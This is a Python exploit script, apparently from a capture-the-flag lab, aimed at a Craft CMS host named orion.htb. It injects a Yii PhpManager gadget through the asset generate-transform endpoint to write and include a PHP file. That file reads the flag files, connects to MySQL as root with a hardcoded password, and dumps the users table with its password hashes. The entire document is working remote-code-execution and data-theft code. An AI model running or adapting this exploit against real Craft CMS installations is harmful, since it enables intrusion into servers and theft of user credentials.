import requests, re, base64, time

HOST = 'http://orion.htb'

def inject_b64(php_code):
    b64 = base64.b64encode(php_code.encode()).decode()
    item_file = 'php://filter/read=convert.base64-decode/resource=data://text/plain;base64,' + b64
    s = requests.Session()
    s.get(f'{HOST}/index.php?p=admin/dashboard')
    r2 = s.get(f'{HOST}/index.php?p=admin/dashboard')
    m = re.search(r'csrfTokenValue":"([^"]+)"', r2.text)
    tok = m.group(1) if m else ''
    body = {"assetId":11,"handle":{"width":1,"height":1,"as session":{"class":"craft\\behaviors\\FieldLayoutBehavior","__class":"yii\\rbac\\PhpManager","__construct()":[{"itemFile":item_file}]}}}
    headers = {'Content-Type':'application/json','X-CSRF-Token':tok}
    return s.post(f'{HOST}/index.php?p=admin/actions/assets/generate-transform', json=body, headers=headers, timeout=30)

# Step 1: Write PHP file that reads flags/DB into $_ENV and calls phpinfo()
php_code = (
    '<?php '
    '$uf = @file_get_contents("/home/adam/user.txt"); '
    '$rf = @file_get_contents("/root/root.txt"); '
    '$_ENV["UF"] = $uf !== false ? trim($uf) : "NO_UF"; '
    '$_ENV["RF"] = $rf !== false ? trim($rf) : "NO_RF"; '
    'try { '
    '  $db = new PDO("mysql:host=127.0.0.1;dbname=orion", "root", "SuperSecureCraft123Pass!"); '
    '  $us = $db->query("SELECT id,username,email,password,admin FROM users")->fetchAll(PDO::FETCH_ASSOC); '
    '  $_ENV["USERS"] = json_encode($us); '
    '  $tbls = $db->query("SHOW TABLES")->fetchAll(PDO::FETCH_COLUMN); '
    '  $_ENV["TABLES"] = implode(",", $tbls); '
    '  $sfp = $db->query("SHOW VARIABLES LIKE \'secure_file_priv\'")->fetchColumn(1); '
    '  $_ENV["SFP"] = $sfp !== false ? $sfp : "NULL"; '
    '} catch (Exception $e) { '
    '  $_ENV["DBERR"] = $e->getMessage(); '
    '} '
    'phpinfo(); '
    '?>'
)

php_b64 = base64.b64encode(php_code.encode()).decode()
write_php = '<?php file_put_contents("/dev/shm/pi.php", base64_decode("' + php_b64 + '")); ?>'

print("[*] Step 1: Writing phpinfo exfil script to /dev/shm/pi.php ...")
r = inject_b64(write_php)
print(f"    Status: {r.status_code}")
time.sleep(2)

# Step 2: Include pi.php via PhpManager
print("[*] Step 2: Including pi.php via PhpManager ...")
s = requests.Session()
s.get(f'{HOST}/index.php?p=admin/dashboard')
r2 = s.get(f'{HOST}/index.php?p=admin/dashboard')
m = re.search(r'csrfTokenValue":"([^"]+)"', r2.text)
tok = m.group(1) if m else ''
body = {"assetId":11,"handle":{"width":1,"height":1,"as session":{"class":"craft\\behaviors\\FieldLayoutBehavior","__class":"yii\\rbac\\PhpManager","__construct()":[{"itemFile":"/dev/shm/pi.php"}]}}}
headers = {'Content-Type':'application/json','X-CSRF-Token':tok}
r3 = s.post(f'{HOST}/index.php?p=admin/actions/assets/generate-transform', json=body, headers=headers, timeout=60)

print(f"    Status: {r3.status_code}, Len: {len(r3.text)}")
t = r3.text

# Check for phpinfo
if 'PHP Version' in t:
    print('[+] PHPINFO OUTPUT FOUND!')
    
    # Search for our env variables in the output
    for kw in ['UF]', 'RF]', 'USERS]', 'TABLES]', 'SFP]', 'DBERR]', 'NO_UF', 'NO_RF']:
        if kw in t:
            # Find the table row containing this env var
            idx = t.index(kw)
            # Get surrounding context - phpinfo uses <tr><td> format
            start = max(0, idx - 100)
            end = min(len(t), idx + 200)
            context = t[start:end]
            print(f'\n[+] Found "{kw}":')
            # Clean up HTML for display
            context_clean = context.replace('&gt;', '>').replace('&lt;', '<').replace('<br />', '\n')
            print(f'    {context_clean}')
else:
    print('[-] phpinfo output NOT found')
    # Check what we got instead
    print(f'\nFirst 500: {t[:500]}')
    print(f'\nLast 1000: {t[-1000:]}')
